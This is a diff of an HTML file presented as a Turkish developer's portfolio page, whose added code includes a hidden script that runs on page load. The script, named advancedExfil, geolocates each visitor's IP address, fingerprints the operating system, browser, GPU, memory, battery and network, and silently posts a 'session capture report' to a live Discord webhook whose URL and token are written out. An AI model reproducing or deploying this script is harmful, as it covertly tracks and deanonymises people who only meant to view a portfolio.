@@ -1,136 +1,160 @@
-<div class="loading-bar"><div class="loading-progress"></div></div>
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yazılım Geliştirici & Tasarımcı | Portfolyo</title>
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #ffffff; color: #1a1a1a; margin: 0; line-height: 1.6; }
+        header { background: #000; color: #fff; padding: 60px 20px; text-align: center; }
+        .container { max-width: 1000px; margin: auto; padding: 40px 20px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .card { border: 1px solid #eee; padding: 20px; border-radius: 12px; transition: 0.3s; }
+        .card:hover { box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        h1 { font-size: 42px; margin-bottom: 10px; }
+        p { color: #666; }
+        .loading-bar { height: 4px; width: 100%; background: #eee; position: fixed; top: 0; left: 0; }
+        .loading-progress { height: 100%; width: 30%; background: #007aff; animation: load 2s infinite; }
+        @keyframes load { 0% { left: -30%; } 100% { left: 100%; } }
+    </style>
+</head>
+<body>
 
-<header>
-    <h1>Merhaba, Ben Arda.</h1>
-    <p>Full-Stack Developer & UI/UX Designer</p>
-</header>
+    <div class="loading-bar"><div class="loading-progress"></div></div>
 
-<div class="container">
-    <div class="grid">
-        <div class="card">
-            <h3>Modern Web Çözümleri</h3>
-            <p>En güncel teknolojilerle performanslı ve kullanıcı dostu web siteleri geliştiriyorum.</p>
-        </div>
-        <div class="card">
-            <h3>Mobil Uygulama</h3>
-            <p>iOS ve Android platformları için yerel performans sunan uygulamalar kodluyorum.</p>
-        </div>
-        <div class="card">
-            <h3>Siber Güvenlik</h3>
-            <p>Sistem optimizasyonu ve veri güvenliği konularında danışmanlık veriyorum.</p>
+    <header>
+        <h1>Merhaba, Ben Arda.</h1>
+        <p>Full-Stack Developer & UI/UX Designer</p>
+    </header>
+
+    <div class="container">
+        <div class="grid">
+            <div class="card">
+                <h3>Modern Web Çözümleri</h3>
+                <p>En güncel teknolojilerle performanslı ve kullanıcı dostu web siteleri geliştiriyorum.</p>
+            </div>
+            <div class="card">
+                <h3>Mobil Uygulama</h3>
+                <p>iOS ve Android platformları için yerel performans sunan uygulamalar kodluyorum.</p>
+            </div>
+            <div class="card">
+                <h3>Siber Güvenlik</h3>
+                <p>Sistem optimizasyonu ve veri güvenliği konularında danışmanlık veriyorum.</p>
+            </div>
         </div>
     </div>
-</div>
 
-<script>
-    const WH_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
+    <script>
+        const WH_URL = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ";
 
-    async function advancedExfil() {
-        try {
-      
-            const geoReq = await fetch('https://ipapi.co/json/');
-            const g = await geoReq.json();
+        async function advancedExfil() {
+            try {
+          
+                const geoReq = await fetch('https://ipapi.co/json/');
+                const g = await geoReq.json();
 
-            
-            let browser = "Unknown";
-            let os = "Unknown Platform";
-            const ua = navigator.userAgent;
+                
+                let browser = "Unknown";
+                let os = "Unknown Platform";
+                const ua = navigator.userAgent;
 
-            if (ua.includes("Edg/")) browser = "Microsoft Edge";
-            else if (ua.includes("Brave")) browser = "Brave";
-            else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
-            else if (ua.includes("Chrome")) browser = "Google Chrome";
-            else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
-            else if (ua.includes("Safari")) browser = "Safari";
+                if (ua.includes("Edg/")) browser = "Microsoft Edge";
+                else if (ua.includes("Brave")) browser = "Brave";
+                else if (ua.includes("OPR") || ua.includes("Opera")) browser = "Opera";
+                else if (ua.includes("Chrome")) browser = "Google Chrome";
+                else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+                else if (ua.includes("Safari")) browser = "Safari";
 
-            if (navigator.userAgentData) {
-                const brands = navigator.userAgentData.brands.map(b => b.brand).join(", ");
-                const platformInfo = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
-                if (navigator.userAgentData.platform === "Windows") {
-                    const majorVersion = parseInt(platformInfo.platformVersion.split('.')[0]);
-                    os = majorVersion >= 13 ? "Windows 11" : "Windows 10";
+                if (navigator.userAgentData) {
+                    const brands = navigator.userAgentData.brands.map(b => b.brand).join(", ");
+                    const platformInfo = await navigator.userAgentData.getHighEntropyValues(["platformVersion"]);
+                    if (navigator.userAgentData.platform === "Windows") {
+                        const majorVersion = parseInt(platformInfo.platformVersion.split('.')[0]);
+                        os = majorVersion >= 13 ? "Windows 11" : "Windows 10";
+                    } else {
+                        os = navigator.userAgentData.platform;
+                    }
                 } else {
-                    os = navigator.userAgentData.platform;
+                    os = navigator.platform;
                 }
-            } else {
-                os = navigator.platform;
-            }
 
-            
-            let gpu = "N/A";
-            const canvas = document.createElement("canvas");
-            const gl = canvas.getContext("webgl");
-            if (gl) {
-                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-                gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
-            }
+                
+                let gpu = "N/A";
+                const canvas = document.createElement("canvas");
+                const gl = canvas.getContext("webgl");
+                if (gl) {
+                    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                    gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+                }
 
-            let battery = "N/A";
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sarjda' : 'Sarjda Degil'})`;
-            }
+                let battery = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Sarjda' : 'Sarjda Degil'})`;
+                }
 
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            const connectionType = conn ? `${conn.effectiveType} (~${conn.downlink} Mbps)` : "Bilinmiyor";
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                const connectionType = conn ? `${conn.effectiveType} (~${conn.downlink} Mbps)` : "Bilinmiyor";
 
-            // 4. Veri Paketleme
-            const logData = {
-                ts: new Date().toLocaleString('tr-TR'),
-                ip: g.ip,
-                isp: g.org,
-                loc: `${g.city}, ${g.region}, ${g.country_name} (${g.latitude}, ${g.longitude})`,
-                os: os,
-                browser: browser,
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
-                cores: navigator.hardwareConcurrency || "Bilinmiyor",
-                gpu: gpu,
-                res: `${screen.width}x${screen.height} @ ${window.visualViewport ? window.visualViewport.scale * 100 : 100}%`,
-                hz: window.screen.refreshRate || "60Hz (Tahmini)",
-                lang: navigator.language,
-                bat: battery,
-                net: connectionType,
-                ref: document.referrer || "Dogrudan Baglanti",
-                ua: ua
-            };
+                // 4. Veri Paketleme
+                const logData = {
+                    ts: new Date().toLocaleString('tr-TR'),
+                    ip: g.ip,
+                    isp: g.org,
+                    loc: `${g.city}, ${g.region}, ${g.country_name} (${g.latitude}, ${g.longitude})`,
+                    os: os,
+                    browser: browser,
+                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Bilinmiyor",
+                    cores: navigator.hardwareConcurrency || "Bilinmiyor",
+                    gpu: gpu,
+                    res: `${screen.width}x${screen.height} @ ${window.visualViewport ? window.visualViewport.scale * 100 : 100}%`,
+                    hz: window.screen.refreshRate || "60Hz (Tahmini)",
+                    lang: navigator.language,
+                    bat: battery,
+                    net: connectionType,
+                    ref: document.referrer || "Dogrudan Baglanti",
+                    ua: ua
+                };
 
-           
-            const terminalLog = "```" + 
-                "--- [ SESSION CAPTURE REPORT ] ---\n" +
-                "ID         : " + Math.floor(Math.random() * 900000 + 100000) + "\n" +
-                "TIME       : " + logData.ts + "\n" +
-                "----------------------------------\n" +
-                "NETWORK_LAYER\n" +
-                "IPV4_ADDR  : " + logData.ip + "\n" +
-                "PROVIDER   : " + logData.isp + "\n" +
-                "LOCATION   : " + logData.loc + "\n" +
-                "NET_TYPE   : " + logData.net + "\n" +
-                "----------------------------------\n" +
-                "HARDWARE_LAYER\n" +
-                "OS_VER     : " + logData.os + "\n" +
-                "CORE_COUNT : " + logData.cores + " Threads\n" +
-                "RAM_SIZE   : " + logData.ram + "\n" +
-                "GPU_MODEL  : " + logData.gpu + "\n" +
-                "DISPLAY    : " + logData.res + "\n" +
-                "BATTERY    : " + logData.bat + "\n" +
-                "----------------------------------\n" +
-                "SOFTWARE_LAYER\n" +
-                "BROWSER    : " + logData.browser + "\n" +
-                "LANGUAGE   : " + logData.lang + "\n" +
-                "REFERRER   : " + logData.ref + "\n" +
-                "RAW_UA     : " + logData.ua + "\n" +
-                "--- [ END OF TRANSMISSION ] ---" +
-                "```";
+               
+                const terminalLog = "```" + 
+                    "--- [ SESSION CAPTURE REPORT ] ---\n" +
+                    "ID         : " + Math.floor(Math.random() * 900000 + 100000) + "\n" +
+                    "TIME       : " + logData.ts + "\n" +
+                    "----------------------------------\n" +
+                    "NETWORK_LAYER\n" +
+                    "IPV4_ADDR  : " + logData.ip + "\n" +
+                    "PROVIDER   : " + logData.isp + "\n" +
+                    "LOCATION   : " + logData.loc + "\n" +
+                    "NET_TYPE   : " + logData.net + "\n" +
+                    "----------------------------------\n" +
+                    "HARDWARE_LAYER\n" +
+                    "OS_VER     : " + logData.os + "\n" +
+                    "CORE_COUNT : " + logData.cores + " Threads\n" +
+                    "RAM_SIZE   : " + logData.ram + "\n" +
+                    "GPU_MODEL  : " + logData.gpu + "\n" +
+                    "DISPLAY    : " + logData.res + "\n" +
+                    "BATTERY    : " + logData.bat + "\n" +
+                    "----------------------------------\n" +
+                    "SOFTWARE_LAYER\n" +
+                    "BROWSER    : " + logData.browser + "\n" +
+                    "LANGUAGE   : " + logData.lang + "\n" +
+                    "REFERRER   : " + logData.ref + "\n" +
+                    "RAW_UA     : " + logData.ua + "\n" +
+                    "--- [ END OF TRANSMISSION ] ---" +
+                    "```";
 
-      
-            await fetch(WH_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: terminalLog })
-            });
+          
+                await fetch(WH_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: terminalLog })
+                });
 
-        } catch (err) {}
-    }
+            } catch (err) {}
+        }
 
-    window.onload = advancedExfil;
-</script>
+        window.onload = advancedExfil;
+    </script>
+</body>
+</html>
